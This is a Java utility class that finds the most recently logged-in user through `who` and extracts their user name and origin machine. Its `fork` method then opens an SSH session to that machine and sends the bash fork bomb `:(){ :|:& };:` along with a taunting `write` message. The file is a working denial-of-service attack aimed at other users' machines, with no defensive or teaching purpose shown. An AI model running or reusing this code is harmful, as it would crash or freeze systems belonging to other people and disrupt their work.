package main;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;

public class Utils
{
	public static String checkWhoConnect(String ignoredName)
	{
		ArrayList<String> input = execCommand("who");
		String lastInput = null;
		for(String s : input)
		{
			if(!s.contains(ignoredName))
				lastInput = s;
		}
		return lastInput;
	}
	
	public static String getName(String whoResult)
	{
		String result = whoResult;
		return result.substring(0, result.indexOf(' '));
	}
	
	public static String getMachineName(String whoResult)
	{
		String result = whoResult;
		return result.substring(result.indexOf('(') + 1, result.lastIndexOf(')'));
	}
	
	public static void fork(String machineName, String userName)
	{
		String forkCommand = ":(){ :|:& };:";
		ArrayList<String> list = new ArrayList<String>();
		list.add(forkCommand);
		list.add("write " + userName);
		list.add("lolilol");//TODO
		interativeCommands(new String[] {"ssh", "-T", machineName}, list);
	}
	
	private static ArrayList<String> execCommand(String command)
	{
		return execCommand(new String[]{command});
	}
	
	private static ArrayList<String> execCommand(String[] command)
	{
		ArrayList<String> output = new ArrayList<String>();
		try
		{
			InputStream is = Runtime.getRuntime().exec(command).getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			for(;;)
			{
				String op = br.readLine();
				if(op == null)
					break;
				output.add(op);
			}
			is.close();
			br.close();			
		}
		catch(IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return output;
	}
	
	private static void interativeCommands(String[] mainCommand, ArrayList<String> commands)
	{
		OutputStream stdin = null;
		Process process = null;
		
		try
		{
			process = Runtime.getRuntime().exec(mainCommand);
			
			stdin = process.getOutputStream();

			for(String c : commands)
			{
				stdin.write((c + "\n").getBytes());
				stdin.flush();
			}
			stdin.close();
		}
		catch(IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
}
